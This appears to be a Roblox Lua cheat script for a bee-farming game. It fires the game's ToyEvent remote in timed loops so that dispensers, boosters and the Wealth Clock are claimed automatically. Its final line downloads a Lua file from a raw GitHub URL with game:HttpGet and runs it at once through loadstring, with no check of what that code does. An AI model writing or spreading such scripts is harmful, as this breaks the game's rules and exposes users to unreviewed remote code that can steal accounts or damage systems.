local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ToyEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("ToyEvent")

-- Dispensers and their cooldowns in seconds
local dispensers = {
    ["Free Ant Pass Dispenser"] = 2 * 60 * 60,       -- 2 hours
    ["Honey Dispenser"] = 1 * 60 * 60,               -- 1 hour
    ["Blueberry Dispenser"] = 4 * 60 * 60,           -- 4 hours
    ["Blue Field Booster"] = 45 * 60,                -- 45 minutes
    ["Red Field Booster"] = 45 * 60,
    ["Strawberry Dispenser"] = 4 * 60 * 60,
    ["Field Booster"] = 45 * 60,
    ["Treat Dispenser"] = 1 * 60 * 60,
    ["Wealth Clock"] = 1 * 60 * 60,
    ["Coconut Dispenser"] = 4 * 60 * 60
}

for name, cooldown in pairs(dispensers) do
    task.spawn(function()
        while true do
            local args = {
                [1] = name
            }

            ToyEvent:FireServer(unpack(args))
            print("Used:", name)

            task.wait(cooldown)
        end
    end)
end

wait()

loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/main/script.lua"))()
